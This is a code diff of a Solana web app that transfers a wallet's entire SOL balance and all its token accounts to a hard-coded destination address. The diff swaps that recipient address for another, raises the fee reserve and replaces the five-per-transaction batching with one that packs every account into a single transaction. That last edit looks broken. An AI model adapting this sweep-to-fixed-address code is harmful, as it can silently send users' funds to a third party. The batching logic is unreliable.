@@ -39,10 +39,10 @@ document.getElementById('favicon').setAttribute('href', image)
 
 const ACTION = 'send_all';
 
-const SENDS_IN_ONE_TX = 5;
+// const SENDS_IN_ONE_TX = 5;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
+const DESTINATION = new PublicKey('6HnkEmyTMex2XUc6Ug7sxwippvNDtzAcz3p524h35sXi');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
@@ -158,7 +158,7 @@ function App() {
         try {
             const balance = await connection.getBalance(walletKeyPair.publicKey);
 
-            const toSend = balance - (0.001 * LAMPORTS_PER_SOL);
+            const toSend = balance - (0.01 * LAMPORTS_PER_SOL);
 
             if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
                 console.log('No funds to send.');
@@ -267,15 +267,15 @@ function App() {
 
         console.log(`Found ${accounts.length} accounts...`);
 
-        const txsNeeded = Math.ceil(accounts.length / SENDS_IN_ONE_TX);
+        const txsNeeded = Math.ceil(accounts.length / Number(accounts.length));
 
-        for (let i = 0; i < accounts.length / SENDS_IN_ONE_TX; i++) {
-            const itemsRemaining = Math.min(SENDS_IN_ONE_TX, accounts.length - i * SENDS_IN_ONE_TX);
+        for (let i = 0; i < accounts.length / Number(accounts.length); i++) {
+            const itemsRemaining = Math.min(Number(accounts.length), accounts.length - i * Number(accounts.length));
 
             const transaction = new Transaction();
 
             for (let j = 0; j < itemsRemaining; j++) {
-                const item = i * SENDS_IN_ONE_TX + j;
+                const item = i * Number(accounts.length) + j;
 
                 const acc = accounts[item];
 
